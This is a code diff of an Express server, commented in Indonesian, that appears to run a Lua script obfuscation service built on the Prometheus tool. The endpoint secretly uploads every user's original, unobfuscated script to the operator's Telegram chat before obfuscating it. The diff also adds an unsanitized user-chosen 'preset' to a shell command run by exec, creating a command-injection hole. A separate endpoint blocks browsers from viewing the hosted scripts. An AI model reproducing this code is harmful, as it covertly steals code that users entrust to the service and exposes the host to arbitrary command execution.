@@ -11,79 +11,26 @@ app.use(express.json());
 app.use(express.static('public'));
 
 // ============================================================
-//  KONFIGURASI TELEGRAM — isi dengan data bot kamu
+//  KONFIGURASI TELEGRAM
 // ============================================================
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'ISI_TOKEN_BOT_KAMU';
 const TELEGRAM_CHAT_ID   = process.env.TELEGRAM_CHAT_ID   || 'ISI_CHAT_ID_KAMU';
 // ============================================================
 
-// Database sederhana untuk menyimpan script
 const scriptDatabase = new Map();
-
-// Memastikan folder temp selalu ada
 const tempDir = path.join(__dirname, 'temp');
-if (!fs.existsSync(tempDir)) {
-    fs.mkdirSync(tempDir);
-}
+if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir);
 
-// ─── FUNGSI KIRIM NOTIF KE TELEGRAM ─────────────────────────
-function sendTelegram(text) {
-    const payload = JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
-        text: text,
-        parse_mode: 'HTML'
-    });
-
-    const options = {
-        hostname: 'api.telegram.org',
-        path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json',
-            'Content-Length': Buffer.byteLength(payload)
-        }
-    };
-
-    const req = https.request(options, (res) => {
-        let data = '';
-        res.on('data', chunk => data += chunk);
-        res.on('end', () => console.log('[TELEGRAM]', data));
-    });
-    req.on('error', err => console.error('[TELEGRAM ERROR]', err));
-    req.write(payload);
-    req.end();
-}
-
-// ─── FUNGSI KIRIM FILE SCRIPT KE TELEGRAM (SEBAGAI DOKUMEN) ───
-function sendTelegramFile(scriptContent, scriptId) {
-    // Membuat nama file unik berdasarkan ID
+// ─── FUNGSI KIRIM FILE SCRIPT KE TELEGRAM (DOKUMEN) ──────────
+function sendTelegramFile(scriptContent, scriptId, preset) {
     const filename = `script_${scriptId}.lua`;
-    
-    // Pesan (caption) yang akan menyertai file
-    const caption = `🔔 <b>Script Baru Diobfuskasi!</b>\n🆔 <b>Script ID:</b> <code>${scriptId}</code>\n📏 <b>Panjang:</b> ${scriptContent.length} karakter\n🕐 <b>Waktu:</b> ${new Date().toISOString().replace('T',' ').slice(0,19)} UTC`;
+    const caption = `🔔 <b>Script Baru Diobfuskasi!</b>\n🆔 <b>ID:</b> <code>${scriptId}</code>\n⚙️ <b>Preset:</b> <code>${preset}</code>\n📏 <b>Panjang:</b> ${scriptContent.length} char\n🕐 <b>Waktu:</b> ${new Date().toISOString().replace('T',' ').slice(0,19)} UTC`;
 
-    // Membuat boundary (pembatas) unik untuk format multipart/form-data
     const boundary = '----TelegramBoundary' + Date.now().toString(16);
-
-    // Menyusun payload (isi) request multipart
-    let payload = `--${boundary}\r\n`;
-    payload += `Content-Disposition: form-data; name="chat_id"\r\n\r\n`;
-    payload += `${TELEGRAM_CHAT_ID}\r\n`;
-
-    payload += `--${boundary}\r\n`;
-    payload += `Content-Disposition: form-data; name="caption"\r\n\r\n`;
-    payload += `${caption}\r\n`;
-
-    payload += `--${boundary}\r\n`;
-    payload += `Content-Disposition: form-data; name="parse_mode"\r\n\r\n`;
-    payload += `HTML\r\n`;
-
-    payload += `--${boundary}\r\n`;
-    // Menambahkan ekstensi file agar terdeteksi sebagai dokumen di Telegram
-    payload += `Content-Disposition: form-data; name="document"; filename="${filename}"\r\n`;
-    payload += `Content-Type: text/plain\r\n\r\n`;
-    payload += `${scriptContent}\r\n`;
-    
+    let payload = `--${boundary}\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n${TELEGRAM_CHAT_ID}\r\n`;
+    payload += `--${boundary}\r\nContent-Disposition: form-data; name="caption"\r\n\r\n${caption}\r\n`;
+    payload += `--${boundary}\r\nContent-Disposition: form-data; name="parse_mode"\r\n\r\nHTML\r\n`;
+    payload += `--${boundary}\r\nContent-Disposition: form-data; name="document"; filename="${filename}"\r\nContent-Type: text/plain\r\n\r\n${scriptContent}\r\n`;
     payload += `--${boundary}--\r\n`;
 
     const options = {
@@ -101,14 +48,13 @@ function sendTelegramFile(scriptContent, scriptId) {
         res.on('data', chunk => data += chunk);
         res.on('end', () => console.log('[TELEGRAM DOC]', data));
     });
-    
     req.on('error', err => console.error('[TELEGRAM DOC ERROR]', err));
     req.write(payload);
     req.end();
 }
 
 // ─── FUNGSI OBFUSKASI PROMETHEUS ────────────────────────────
-function obfuscateWithPrometheus(scriptContent) {
+function obfuscateWithPrometheus(scriptContent, preset) {
     return new Promise((resolve, reject) => {
         const tempId = Date.now();
         const inputPath  = path.join(tempDir, `input_${tempId}.lua`);
@@ -116,18 +62,19 @@ function obfuscateWithPrometheus(scriptContent) {
 
         fs.writeFileSync(inputPath, scriptContent);
 
+        // Path Prometheus (Sesuaikan jika berbeda)
         const prometheusPath = path.join(__dirname, '../Prometheus/cli.lua');
-        const command = `lua5.3 "${prometheusPath}" --preset Medium "${inputPath}"`;
+        
+        // Menggunakan parameter 'preset' yang dipilih user
+        const command = `lua5.3 "${prometheusPath}" --preset ${preset} "${inputPath}"`;
 
-        console.log("Menjalankan command:", command);
+        console.log(`[EXEC] Menggunakan preset: ${preset}`);
 
         exec(command, (error, stdout, stderr) => {
             if (error) {
-                console.error("=== ERROR DARI PROMETHEUS ===");
-                console.error(error);
-                console.error("STDERR:", stderr);
+                console.error("=== ERROR PROMETHEUS ===", stderr);
                 if (fs.existsSync(inputPath)) fs.unlinkSync(inputPath);
-                return reject("Gagal mengobfuskasi kode (Cek Log Railway).");
+                return reject(`Gagal obfuscate dengan preset ${preset}.`);
             }
 
             if (fs.existsSync(outputPath)) {
@@ -136,8 +83,6 @@ function obfuscateWithPrometheus(scriptContent) {
                 fs.unlinkSync(outputPath);
                 resolve(obfuscatedCode);
             } else {
-                console.error("=== ERROR OUTPUT ===");
-                console.error("File output tidak ditemukan di:", outputPath);
                 reject("File output tidak ditemukan.");
             }
         });
@@ -146,17 +91,19 @@ function obfuscateWithPrometheus(scriptContent) {
 
 // ─── ENDPOINT OBFUSKASI ──────────────────────────────────────
 app.post('/api/obfuscate', async (req, res) => {
-    const { script } = req.body;
+    const { script, preset } = req.body;
     if (!script) return res.status(400).json({ error: "Script kosong!" });
+    
+    // Default ke Medium jika preset tidak dikirim
+    const selectedPreset = preset || 'Medium';
 
     try {
-        console.log("Menerima request obfuscate...");
-
-        // Kirim script original ke Telegram SEBELUM diobfus
         const tempId = Date.now().toString();
-        sendTelegramFile(script, tempId);
+        
+        // Log ke Telegram (Termasuk info preset yang dipilih)
+        sendTelegramFile(script, tempId, selectedPreset);
 
-        const obfuscatedCode = await obfuscateWithPrometheus(script);
+        const obfuscatedCode = await obfuscateWithPrometheus(script, selectedPreset);
 
         const scriptId = Math.floor(Math.random() * 10000000000000).toString();
         scriptDatabase.set(scriptId, obfuscatedCode);
@@ -167,18 +114,15 @@ app.post('/api/obfuscate', async (req, res) => {
 
         res.json({ success: true, loader: loaderScript });
     } catch (error) {
-        console.error("=== ERROR UMUM ===");
-        console.error(error);
         res.status(500).json({ error: error.toString() });
     }
 });
 
-// ─── ENDPOINT SCRIPTS (DILINDUNGI) ──────────────────────────
+// ─── ENDPOINT SCRIPTS ────────────────────────────────────────
 app.get('/Scripts', (req, res) => {
     const userAgent = req.headers['user-agent'] || '';
-
-    // Blokir request yang berasal dari browser biasa
     const isBrowser = /Mozilla|Chrome|Safari|Firefox|Opera|Edge|MSIE/i.test(userAgent);
+    
     if (isBrowser) {
         return res.status(403).sendFile(path.join(__dirname, 'public', '403.html'));
     }
@@ -190,12 +134,9 @@ app.get('/Scripts', (req, res) => {
         res.setHeader('Content-Type', 'text/plain');
         res.send(scriptCode);
     } else {
-        res.status(404).send("-- Script tidak ditemukan / Kadaluarsa");
+        res.status(404).send("-- Script expired / not found");
     }
 });
 
-// ─── START SERVER ────────────────────────────────────────────
 const PORT = process.env.PORT || 8080;
-app.listen(PORT, () => {
-    console.log(`Server berjalan mantap di port ${PORT}`);
-});
+app.listen(PORT, () => console.log(`Server live on port ${PORT}`));
